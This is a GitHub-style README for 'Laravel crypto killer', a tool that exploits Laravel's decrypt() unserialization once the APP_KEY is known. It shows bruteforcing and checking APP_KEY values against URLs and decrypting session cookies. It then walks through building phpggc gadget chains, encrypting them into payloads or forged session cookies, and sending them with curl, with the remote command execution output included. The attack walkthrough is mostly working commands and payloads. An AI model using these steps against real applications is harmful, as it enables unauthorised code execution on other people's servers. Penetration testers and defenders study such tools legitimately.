# Laravel crypto killer

<p align="center">
    <img src="logo_laravel_cryptokiller.webp" alt="Logo" width="400px"/>
</p>

A tool designed to exploit bad implementations of decryption mechanisms in Laravel applications.

This tool was firstly designed to craft payloads targeting the Laravel `decrypt()` function from the package `Illuminate\Encryption`.

It can also be used to decrypt any data encrypted via `encrypt()` or `encryptString()`.

The tool requires a valid `APP_KEY` to be used, you can also try to bruteforce them if you think there is a potential key reuse from a public project for example.

Authors of the tool: `@_remsio_` `@Kainx42`.

## Usage

A helper can be used on each option to use the tool:

```bash
$ ./laravel_crypto_killer.py -h
usage: laravel_crypto_killer.py [-h] {exploit,encrypt,decrypt,bruteforce} ...

 ___                                _       ___                    _             __       _   _              
(O O)                              (_ )    ( O_`\                 ( )_          ( O)    _(_ )(_ )            
 | |      _ _ _ __  _ _ _   _   __  | |    | ( (_)_ __ _   _ _ _  | ,_)  _      |  |/')(_)| | | |   __  _ __ 
 | |    /'_` ( '__/'_` ( ) ( )/'__`\| |    | |  _( '__( ) ( ( '_`\| |  /'_`\    |  , < | || | | | /'__`( '__)
<  |__ ( (_| | | ( (_| | \_/ (  ___/| |   <  (_( | |  | (_) | (_) | |_( (_) )  <  | \`\| || | | |(  ___| |   
<_____/`\__,_(_) `\__,_`\___/`\____(___)  <_____/(_)  `\__, | ,__/`\__`\___/'  <__)  (_(_(___(___`\____(_)   
                                                     ( )_| | |                                             
                                                     `\___/(_)                                             
        This tool was firstly designed to craft payload targetting the Laravel decrypt() function from the package Illuminate\Encryption.
        
        It can also be used to decrypt any data encrypted via encrypt() or encryptString().

        The tool requires a valid APP_KEY to be used, you can also try to bruteforce them if you think there is a potential key reuse from a public project for example.

        Authors of the tool : @_remsio_, @Kainx42
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        

options:
  -h, --help            show this help message and exit

subcommands:
  You can use the option -h on each subcommand to get more info

  {exploit,encrypt,decrypt,bruteforce}
    exploit             Exploit mode
    encrypt             Encrypt mode
    decrypt             Decrypt mode
    bruteforce          Bruteforce potential values of APP_KEY. By default, all the values from the folder wordlists will be loaded.

$ ./laravel_crypto_killer.py encrypt -h
usage: laravel_crypto_killer.py encrypt [-h] [--key KEY] --value VALUE

optional arguments:
  -h, --help            show this help message and exit
  --key KEY, -k KEY     Key used by Laravel stored in APP_KEY in .env
  --value VALUE, -v VALUE
                        Value of the string data you want to laravel cipher (it has to be base64 encoded!). The place where you put a gadget chain from phpggc basically.
  --session_cookie SESSION_COOKIE, -sc SESSION_COOKIE
                        Add this option to format the ciphered value to exploit a Laravel Session Cookie (option SESSION_DRIVER=cookie). it should be a 40 character long hex chain
```

## Targets of the tool

The `decrypt` function from `Illuminate\Encryption` is often used in Laravel applications. By default, it manages serialized data and ciphers it using Laravel secret key stored in `APP_KEY`.

```php
namespace Illuminate\Encryption;
[...]
public function decrypt($payload, $unserialize = true)
    {
        $payload = $this->getJsonPayload($payload);

        $iv = base64_decode($payload['iv']);

        $decrypted = \openssl_decrypt(
            $payload['value'], $this->cipher, $this->key, 0, $iv
        );

        if ($decrypted === false) {
            throw new DecryptException('Could not decrypt the data.');
        }

        return $unserialize ? unserialize($decrypted) : $decrypted;
    }
```

Laravel policy is, at the time, to not patch gadget chains.

Therefore a user able to send data to a `decrypt` function and in possession of the application secret key will be able to gain remote command execution on a Laravel application.

## Environment used in the examples

The following controller can be used to test the tool:

```php
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\Response;

class EncryptController extends Controller
{
    public function encrypt(string $toencrypt): Response
    {
        $result = encrypt($toencrypt);
        return response($result, 200);
    }


    public function decrypt(string $todecrypt): Response
    {
        $result = decrypt($todecrypt);
        return response($result, 200);
    }
}
```

### Decrypt

By using the `APP_KEY` value, it is possible to decrypt data with `laravel_crypto_killer`.

First, retrieve a value based from the encrypt function.

```bash
$ curl http://localhost/encrypt/aaa
eyJpdiI6IkczTHpUZkNHWk4yUnFUSjFrM2Q1WkE9PSIsInZhbHVlIjoiS1RLRXJRd01wTDJvZFZmbzl5SkFPQT09IiwibWFjIjoiMTFhZDJiM2Y2NDMzNjViMzNjMjg5MGI2ZTZlNTZkZjY2NTE0ZDhiMTc5ZmU0MGZiMDc5NzU4YWI0YTcxNTAwZSIsInRhZyI6IiJ9
```

You can then decrypt it if you are in possession of a valid `APP_KEY`.

```bash
$ ./laravel_crypto_killer.py decrypt -k CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA= -v eyJpdiI6IkczTHpUZkNHWk4yUnFUSjFrM2Q1WkE9PSIsInZhbHVlIjoiS1RLRXJRd01wTDJvZFZmbzl5SkFPQT09IiwibWFjIjoiMTFhZDJiM2Y2NDMzNjViMzNjMjg5MGI2ZTZlNTZkZjY2NTE0ZDhiMTc5ZmU0MGZiMDc5NzU4YWI0YTcxNTAwZSIsInRhZyI6IiJ9
[+] Unciphered value identified!
[*] Unciphered value
s:3:"aaa";
[*] Base64 encoded unciphered version
b'czozOiJhYWEiOwYGBgYGBg=='
[+] Matched serialized data in results! It's time to exploit unserialization to get RCE mate!
```

### Example of exploitation

If a serialized data is identified in a decryption result, you will probably be able to get a Remote Command execution. To do so, use [phpggc](https://github.com/ambionics/phpggc) developped by Charles Fol to generate a gadget chain. It is better to try to match the version of PHP to use.

```bash
$ php7.4 phpggc Laravel/RCE9 system id -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0=
```

You can then use this value, encrypt it with `laravel_crypto_killer`, and finally send it to the server to get your RCE!

```bash
$ ./laravel_crypto_killer.py encrypt -k CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0=
[+] Here is your laravel ciphered value, happy hacking mate!
eyJpdiI6ICJZdk56TDUvdlNkaUJMRU1sdGdSREpRPT0iLCAidmFsdWUiOiAiZjFjMGhnRkY3OHI4ejArVWxRb2RNVE04OVAzdGFhR2wvYzFHdDdxZFEzeEVSVHUxVzQ1dVdUSis4aUp3VkJqNjNrRzJGaFVuVk4vT0FQRFEwWkRIMnBJMU53ZG5SeG1OMk9Lbzh4aFZ4L2RuSHA5clVIdUtBZDJPakdvd3hPbjI4VDc4WXJkd0Y1SzQ2bFNjRzVzb3RuT0FkNExmbjRHMG54cnJHYUtGc1FhejhOUzlDbWtoQ2V2T1Nxb0drZWZnSVhLUXUrL3FGU2JYaXNjaEdTYkZtbDJSZmxvUXBieGFoWEduOXVidG9KcUJpcjlyOTJWdElTYTQwSysvZG9ZRXNMRElTUU5BZG1IT1kvK0ZCRE5Sbmt6ZlU1ZFh6VTRDQ3M3aVNEanJPSm9sTUxZK1pRVE02L0w2cWxJSmZQUCtya1JHd2RadVB6ckxKOXk2RExtdWxDRkczTXFTQzVxLzVRTkRkSkJpMG9XMTl0WjVwRmJGdWtFTklhbFM3cjM3S2IyUVd1eVgyd2pPcVJCVXQ4NDJVMjIveW13MWV5ZWxHUHR0VWlaRkdWaVoyd3RidndIRnVnTDJrTUVCMkpDaSIsICJtYWMiOiAiMTIyZjBhOWRhMmRjOTk1MWY4MWNkMWQyOWYxZjdjYzQ5ZDEzYWIwMzcwZjY4ZWY5MWI5OWQ4YTg2MjlhNTI3OCIsICJ0YWciOiAiIn0=

$ curl -s http://localhost/decrypt/eyJpdiI6ICJZdk56TDUvdlNkaUJMRU1sdGdSREpRPT0iLCAidmFsdWUiOiAiZjFjMGhnRkY3OHI4ejArVWxRb2RNVE04OVAzdGFhR2wvYzFHdDdxZFEzeEVSVHUxVzQ1dVdUSis4aUp3VkJqNjNrRzJGaFVuVk4vT0FQRFEwWkRIMnBJMU53ZG5SeG1OMk9Lbzh4aFZ4L2RuSHA5clVIdUtBZDJPakdvd3hPbjI4VDc4WXJkd0Y1SzQ2bFNjRzVzb3RuT0FkNExmbjRHMG54cnJHYUtGc1FhejhOUzlDbWtoQ2V2T1Nxb0drZWZnSVhLUXUrL3FGU2JYaXNjaEdTYkZtbDJSZmxvUXBieGFoWEduOXVidG9KcUJpcjlyOTJWdElTYTQwSysvZG9ZRXNMRElTUU5BZG1IT1kvK0ZCRE5Sbmt6ZlU1ZFh6VTRDQ3M3aVNEanJPSm9sTUxZK1pRVE02L0w2cWxJSmZQUCtya1JHd2RadVB6ckxKOXk2RExtdWxDRkczTXFTQzVxLzVRTkRkSkJpMG9XMTl0WjVwRmJGdWtFTklhbFM3cjM3S2IyUVd1eVgyd2pPcVJCVXQ4NDJVMjIveW13MWV5ZWxHUHR0VWlaRkdWaVoyd3RidndIRnVnTDJrTUVCMkpDaSIsICJtYWMiOiAiMTIyZjBhOWRhMmRjOTk1MWY4MWNkMWQyOWYxZjdjYzQ5ZDEzYWIwMzcwZjY4ZWY5MWI5OWQ4YTg2MjlhNTI3OCIsICJ0YWciOiAiIn0= | head -n 1
uid=1337(sail) gid=1000(sail) groups=1000(sail)
```

## Bruteforce mode

In order to identify a valid `APP_KEY` on an application, several wordlists can be used to try to guess one on a Laravel instance.

By default, the `XSRF-TOKEN` and `laravel_session` cookies are based on the `encrypt` function and can be used to perform a bruteforce attempt.

## Check mode

You can easily check the validity of a `APP_KEY` against a URL with the following command:

```bash
$ ./laravel_crypo_killer.py check https://www.example.com ko0ziOprodjT9TOcW3/CP2vyA3pjaRzz0ANa1uiCPU0=
[+] Cookies decrypted:
    * XSRF-TOKEN
    * example_session
```

## Exploit a session stored in the cookie

If the `SESSION_DRIVER` is set to the value `cookie`, `laravel_crypto_killer` has an option to correctly format the session cookie for exploitation.

To exploit this kind of vulnerability, retrieve the cookie following `laravel_session`, in our case it would be `d6WRg1VnF4sWv47men3oo4zBKLylyACOTKGsggKp`:

```bash
$ curl -I http://localhost/login
HTTP/1.1 200 OK
Server: nginx/1.17.10
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.1.29
Cache-Control: no-cache, private
Date: Tue, 03 Sep 2024 11:36:39 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkdhT2luRFJtY2xFRTJrK0xNUXBpVnc9PSIsInZhbHVlIjoiWUoxdnVmVk5qTEU2d3E4Z3hHeE8yK3ZGNGVPRGtLaldoSXZFd1RhTUliOSs2a01PYmVKNTdiUEczak1TT2VtUXhrdTdUWUU1K201OFlzK0QzWmFHWUdFbnRkWkhsTVFNcExQb2o3UndweFMvVEN1SGVyZVZCWFdmSXhYTFVCa2UiLCJtYWMiOiJiNjhkNDgwZDI1NDRlMjkwNGJjNjk4NzU4ZDViOWUyOGIyMzMwZjEzODdmMGEyNWJjZjkyZjY0Zjk0ZGI0NDZkIiwidGFnIjoiIn0%3D; expires=Wed, 04-Sep-2024 11:36:39 GMT; Max-Age=86400; path=/; domain=localhost; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IkxBODRMMTZXVCtQSnFTU0pQcGNjV2c9PSIsInZhbHVlIjoiQVo4c3VQUUdwb1VkZ3VvaTFnK21Jay9NaGlhZmlPSCtRWW1ObmZlY2xmT21RYnhOVk9IeitoeWdoQ3A4NGRMYWExM2JvQmFUZlJxaGZiSmRqK2UxN0pmWVpiWnZsWStnVENvV0VlZEFnSTdlT09sbU5DN2p6eU5vTkFoYlYyc0EiLCJtYWMiOiI1Mzg3YjZjZjM1ZmRiNGQ3M2QwZTBlNTI0ODg1NWFlODM1YjFkZGVlYWNlMjcwNWQ3Yjg5MWIzMDY4Mzc1MzI0IiwidGFnIjoiIn0%3D; expires=Wed, 04-Sep-2024 11:36:39 GMT; Max-Age=86400; path=/; domain=localhost; httponly; samesite=lax
Set-Cookie: d6WRg1VnF4sWv47men3oo4zBKLylyACOTKGsggKp=eyJpdiI6Im5SNVYzVzZIa3B5WWR6ZnpLM0p4ZVE9PSIsInZhbHVlIjoiUTUvWm5RT3BIVzhlQ1dhclA3UnlqalBYMk9pZ0J3UHpDZmlKZy9nVTJkVThVUHJPbzdsanRHNUw2NVJ5Q1oxSERrSmdRcDErVGlUMDRBeGZVekoxaGQ1cGo2UFo1TzdPVmxhV2E2Yms3Wnl5dldFdHdxVUdBNUtoYUZUM054eEF3ZFFSZTY1MUtSSVBGY0pxbitZV0hiTytKeWUwR1RLODY2WjIyeHFQKzNWQllDUUw3enB0NzNoSXJxZUVXMVFmVVRqSmtTZ0NxM3k3TDk2cVUreThwa3BLa0dNMUJpZkhyUGdCUndKTUdaakRjSjhId0wyemZFS1A2c3oxTllhS0lxYzkwOTNJTzM3NTBqV2s1SjBUb3c9PSIsIm1hYyI6IjViYzg2MjMwNWY4Mjk3YjEzZmQwODY2YzdiMmFjMGIyZTEyNDY4Nzk3NzA2ZDM0N2ZjZWJhYWQyZTZmZDgwMmUiLCJ0YWciOiIifQ%3D%3D; expires=Wed, 04-Sep-2024 11:36:39 GMT; Max-Age=86400; path=/; domain=localhost; httponly; samesite=lax
```

Then decrypt the cookies value, it should contain a hash followed by a JSON object containing PHP-serialized data.

```bash
$ ./laravel_crypto_killer.py decrypt -k base64:Bqm5/FxXT5IT0Jx7vbhVvSiMKXTI2JMOCD9XKzHiHJw= -v eyJpdiI6Im5SNVYzVzZIa3B5WWR6ZnpLM0p4ZVE9PSIsInZhbHVlIjoiUTUvWm5RT3BIVzhlQ1dhclA3UnlqalBYMk9pZ0J3UHpDZmlKZy9nVTJkVThVUHJPbzdsanRHNUw2NVJ5Q1oxSERrSmdRcDErVGlUMDRBeGZVekoxaGQ1cGo2UFo1TzdPVmxhV2E2Yms3Wnl5dldFdHdxVUdBNUtoYUZUM054eEF3ZFFSZTY1MUtSSVBGY0pxbitZV0hiTytKeWUwR1RLODY2WjIyeHFQKzNWQllDUUw3enB0NzNoSXJxZUVXMVFmVVRqSmtTZ0NxM3k3TDk2cVUreThwa3BLa0dNMUJpZkhyUGdCUndKTUdaakRjSjhId0wyemZFS1A2c3oxTllhS0lxYzkwOTNJTzM3NTBqV2s1SjBUb3c9PSIsIm1hYyI6IjViYzg2MjMwNWY4Mjk3YjEzZmQwODY2YzdiMmFjMGIyZTEyNDY4Nzk3NzA2ZDM0N2ZjZWJhYWQyZTZmZDgwMmUiLCJ0YWciOiIifQ%3D%3D
[+] Unciphered value identified!
[*] Unciphered value
57b910d166b2a034c861d4e61c4d8e584bbf9d19|{"data":"a:2:{s:6:\"_token\";s:40:\"R4TcbmmERkI6MHSPymWc0DkqJfA3hM87eTghuV73\";s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}","expires":1725449799}
[*] Base64 encoded unciphered version
b'NTdiOTEwZDE2NmIyYTAzNGM4NjFkNGU2MWM0ZDhlNTg0YmJmOWQxOXx7ImRhdGEiOiJhOjI6e3M6NjpcIl90b2tlblwiO3M6NDA6XCJSNFRjYm1tRVJrSTZNSFNQeW1XYzBEa3FKZkEzaE04N2VUZ2h1VjczXCI7czo2OlwiX2ZsYXNoXCI7YToyOntzOjM6XCJvbGRcIjthOjA6e31zOjM6XCJuZXdcIjthOjA6e319fSIsImV4cGlyZXMiOjE3MjU0NDk3OTl9BwcHBwcHBw=='
[+] Matched serialized data in results! It's time to exploit unserialization to get RCE mate!
```

Then retrieve the hash value before the pipe `|`, in the previous case it would be `57b910d166b2a034c861d4e61c4d8e584bbf9d19`, and pass it to the `--session_cookie` option when reencrypting the cookie to get RCE. It needs to match the value from the unciphered cookie, otherwise the exploit will not work.

```bash
$ php8.2 phpggc Laravel/RCE15 'system' 'id' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoyOiJpZCI7fWk6MTtzOjQ6InVzZXIiO319fX0=
$ ./laravel_crypto_killer.py encrypt -k base64:Bqm5/FxXT5IT0Jx7vbhVvSiMKXTI2JMOCD9XKzHiHJw= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoyOiJpZCI7fWk6MTtzOjQ6InVzZXIiO319fX0= -sc=57b910d166b2a034c861d4e61c4d8e584bbf9d19
[+] Here is your laravel ciphered session cookie, happy hacking mate!
eyJpdiI6ICIzNkNNcDlLQ3JVU2ZEMTBxcDdWd1hRPT0iLCAidmFsdWUiOiAiRWlSdVNYeTFQdWh0MXRMcE1JaDluamtCMnE1YTFncHJTa2lPdXVCU2p2eXhQdmYydTdrbjlucGVsWm9hZ1VteEZDbkxiZ1BkVGxHQUU0K0FQL1JXUEFSbVpVV3BMOTdXeUdMTm9mcFVuTVo2QXg5U0w4OE9QZHkyaUk3cUU2SjN1RC9wZHJaVk8wbjlHMlNJYmhZbWtEelIyOEhVLzFMME1kd3hQUGpERURYbmZDQmtNcngxN0xYcWRpdmNzODU5SS9IMzZVcXMxaDJXT1ovNlhoc2NHeHBtQ2RTcHBFNi9yb0habElkNzBIRDRMaTd4V2FPZGpSNjJoVG5OTHRXYkpydVBJRk5hLzBuR1M2SUI5NkFKOXlUaHI1djdMMno0TE4rbHpOUHpRR0JKNDl3WDA0WU1DNEhpZHRhakd3bytRUkRPaEpNYkJBY0RjU0hTQ2hqZVBrTXlHQXJNZjdzaGF2c0UwRFQ0d2l6Tm1GdUVJM21ZQ3NpZnFwcExRWEVCZlpCUkRwNEFpNVFsdUMzTHpBNXh0M2FnMFBoZ1JvQTZlS0VsTzRqMG16WitqQVk4ZXljWUVsU09YcFF3NWZLcDBHdzRja1JSVVZsc3kzZmNOUnRzbktneXVzTVdQQWFCazJsWUhCcU44aTdEMzF1N1I4eWw5UU4zWW1sUnkrWXVRdFNadnFPbTExTWRkWDdaVHFQR3RtZEtrODFTNHVLYnJJRlhPandGSXc0eXdvV2xwRElHdk44VzNDditpZUJTVFpieTZmU092TUZzbXZMT0pJNjRZdWU0SGVmOWZrRmEwMXFnaG4yKzJkV2xpQ3l1blU5dmxqYWdPbGRxMktPWjgwMDhLL1ZGd1V4NU9uVktLRWFLb1ZBVjB5QlNGTjBpOW8xL2taTmVlNENoR0ZSMkxFQjV5TW5sSURiQ3dYZzhqN2xsZVNuTG5EZ0wyb283M3lQTXR4cHYvTk93WVBjLzgrd0l2d3NaM3VRbWF6NGVkWFd1Vk9WaEE0dWlPT0c2bWNEdEFtWmw4SUdsbS95bUU5eDVSN1ZKMjN0WmN1dmhvc1NXWmt2UVloMGJxbDdlRTk0a21JN0Z2a3dYUEFDSSIsICJtYWMiOiAiZDFlNmRiZWFhZTgzYjRiNTMxNGVmNTZjZDgyMDgyYmFkNjE3ZmI3MmIyNzhhOGJkZmZmOGJlMWI4MjA0ZmIzNCIsICJ0YWciOiAiIn0=
```

Finally, use this chain to get your remote command execution. Be careful you also need to specify the value of the `laravel_session` cookie along the cookie actually containing the payload. In our case, the payload is stored inside the `d6WRg1VnF4sWv47men3oo4zBKLylyACOTKGsggKp` cookie, which is referenced inside the `laravel_session` cookie.

```bash
$ curl -s -H 'Cookie:laravel_session=eyJpdiI6IkxBODRMMTZXVCtQSnFTU0pQcGNjV2c9PSIsInZhbHVlIjoiQVo4c3VQUUdwb1VkZ3VvaTFnK21Jay9NaGlhZmlPSCtRWW1ObmZlY2xmT21RYnhOVk9IeitoeWdoQ3A4NGRMYWExM2JvQmFUZlJxaGZiSmRqK2UxN0pmWVpiWnZsWStnVENvV0VlZEFnSTdlT09sbU5DN2p6eU5vTkFoYlYyc0EiLCJtYWMiOiI1Mzg3YjZjZjM1ZmRiNGQ3M2QwZTBlNTI0ODg1NWFlODM1YjFkZGVlYWNlMjcwNWQ3Yjg5MWIzMDY4Mzc1MzI0IiwidGFnIjoiIn0%3D;  d6WRg1VnF4sWv47men3oo4zBKLylyACOTKGsggKp=eyJp[...]]k0a21JN0Z2a3dYUmOGJlMWI4MjA0ZmIzNCIsICJ0YWciOiAiIn0=' http://localhost/login | head -n1
uid=1000(user) gid=1000(user) groups=1000(user),0(root),33(www-data)
```

## Exploit mode

- Livewire :

```bash
$ python3 laravel_crypto_killer.py exploit -e livewire -k 'base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA=' -j request.json --function system -p whoami
{...}
```

## Contribution

You have a cool idea, you encountered an unexpected behavior? Please let us know by opening an issue or submitting a pull request ! :)

# Disclaimer

Synacktiv cannot be held responsible if the tool is used for malicious purposes, it's for educational purposes only.

# License

This project is licensed under the MIT License - see the LICENSE file for details.
